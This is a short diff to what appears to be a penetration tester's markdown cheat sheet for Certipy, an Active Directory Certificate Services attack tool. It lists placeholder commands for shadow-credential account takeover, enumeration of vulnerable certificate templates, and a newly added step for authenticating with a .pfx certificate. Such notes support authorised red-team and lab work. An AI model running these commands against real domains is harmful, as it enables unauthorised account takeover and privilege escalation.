@@ -5,6 +5,7 @@
 ```
 certipy shadow auto -u <user>@<domain> -p '<passwd>' -account <target_user>
 ```
+
 ## Shadow cred using kerberos
 ```
 certipy shadow auto -k -target <ip> -account <target_user>
@@ -19,3 +20,11 @@ certipy find -vulnerable -u <user>@<domain> -p '<passwd>' -dc-ip <ip> -stdout
 ```
 certipy find -enabled -u <user>@<domain> -p '<passwd>' -dc-ip <ip> -stdout
 ```
+
+
+## Authenticating using a pfx
+```
+certipy auth -pfx "<file_name>.pfx" -dc-ip '<DC-IP>' -username '<user>' -domain '<domain>'
+```
+
+
